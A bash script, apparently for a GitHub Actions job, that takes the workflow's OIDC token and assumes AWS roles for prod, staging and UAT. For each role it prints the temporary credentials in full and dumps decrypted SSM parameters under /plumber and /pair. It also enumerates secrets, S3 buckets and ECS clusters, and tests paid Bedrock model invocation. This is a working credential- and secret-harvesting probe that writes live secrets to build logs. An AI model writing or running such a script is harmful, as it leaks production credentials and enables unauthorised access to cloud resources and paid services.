#!/bin/bash
# OIDC role probe (i124967): assume all three plumber roles, print claims/creds, capability matrix, 1 bedrock opus call per successful role
set +e
echo "### ENVNAME=${ENVNAME:-base} REF=${GITHUB_REF} EVENT=${GITHUB_EVENT_NAME} REPO=${GITHUB_REPOSITORY}"
TOKJSON=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
TOK=$(printf '%s' "$TOKJSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
if [ -z "$TOK" ]; then echo "NO_TOKEN: $TOKJSON"; exit 1; fi
echo "### CLAIMS:"
python3 - "$TOK" <<'PY'
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
d=json.loads(base64.urlsafe_b64decode(p))
print(json.dumps(d,indent=1,sort_keys=True))
PY

for ROLE in plumber-prod-github-oidc-role plumber-staging-github-oidc-role plumber-uat-github-oidc-role; do
  echo ""
  echo "===== ASSUME ${ROLE}"
  OUT=$(aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::964715690079:role/${ROLE}" \
        --role-session-name "tmp-i124967-${ROLE}-${ENVNAME:-base}" \
        --web-identity-token "$TOK" --duration-seconds 3600 --region ap-southeast-1 --output json 2>&1)
  RC=$?
  echo "ASSUME_RC_${ROLE}=${RC}"
  echo "$OUT" | head -c 6000
  echo ""
  [ $RC -eq 0 ] || continue
  export AWS_ACCESS_KEY_ID=$(printf '%s' "$OUT" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Credentials"]["AccessKeyId"])')
  export AWS_SECRET_ACCESS_KEY=$(printf '%s' "$OUT" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Credentials"]["SecretAccessKey"])')
  export AWS_SESSION_TOKEN=$(printf '%s' "$OUT" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Credentials"]["SessionToken"])')
  unset AWS_PROFILE
  echo "----- IDENTITY ${ROLE}"
  aws sts get-caller-identity --output json 2>&1 | head -c 1200; echo ""
  echo "----- CAPMATRIX ${ROLE}"
  PROF=""
  for R in ap-southeast-1 us-east-1 us-west-2; do
    echo "## region ${R} list-foundation-models opus"
    aws bedrock list-foundation-models --region "$R" \
      --query "modelSummaries[?contains(modelId,'claude-opus-5-5')].{id:modelId,status:modelLifecycle.status}" \
      --output json 2>&1 | head -c 2000; echo ""
    echo "## region ${R} use-case"
    aws bedrock get-use-case-for-model-access --region "$R" --output json 2>&1 | head -c 700; echo ""
    echo "## region ${R} agreement-offers opus"
    aws bedrock list-foundation-model-agreement-offers --model-id anthropic.claude-opus-5-5 --region "$R" --output json 2>&1 | head -c 1200; echo ""
  done
  echo "## inference-profiles ap-southeast-1"
  PROF=$(aws bedrock list-inference-profiles --region ap-southeast-1 --output text --query "inferenceProfileSummaries[].inferenceProfileId" 2>/dev/null)
  echo "$PROF" | head -c 3000; echo ""
  echo "## ssm /plumber"
  aws ssm get-parameters-by-path --path /plumber --recursive --with-decryption --region ap-southeast-1 --max-items 100 --output json 2>&1 | head -c 30000; echo ""
  echo "## ssm /pair"
  aws ssm get-parameters-by-path --path /pair --recursive --with-decryption --region ap-southeast-1 --max-items 100 --output json 2>&1 | head -c 20000; echo ""
  echo "## secretsmanager"
  aws secretsmanager list-secrets --region ap-southeast-1 --max-items 50 --output json 2>&1 | head -c 8000; echo ""
  echo "## s3"
  aws s3api list-buckets --output json 2>&1 | head -c 8000; echo ""
  echo "## ecs"
  aws ecs list-clusters --region ap-southeast-1 --output json 2>&1 | head -c 3000; echo ""
  echo "----- INVOKE ${ROLE}"
  if echo "$PROF" | grep -q "global.anthropic.claude-opus-5-5"; then
    MODEL="global.anthropic.claude-opus-5-5"
  else
    MODEL="anthropic.claude-opus-5-5"
  fi
  echo "MODEL=${MODEL}"
  aws bedrock-runtime invoke-model --model-id "$MODEL" --region ap-southeast-1 \
    --cli-binary-format raw-in-base64-out \
    --body '{"anthropic_version":"bedrock-2023-05-31","max_tokens":8,"messages":[{"role":"user","content":"Reply OK"}]}' \
    /tmp/out_$$.json 2>&1 | head -c 2000
  echo ""
  echo "INVOKE_BODY:"
  cat /tmp/out_$$.json 2>/dev/null | head -c 3000; echo ""
done
echo "### DONE"
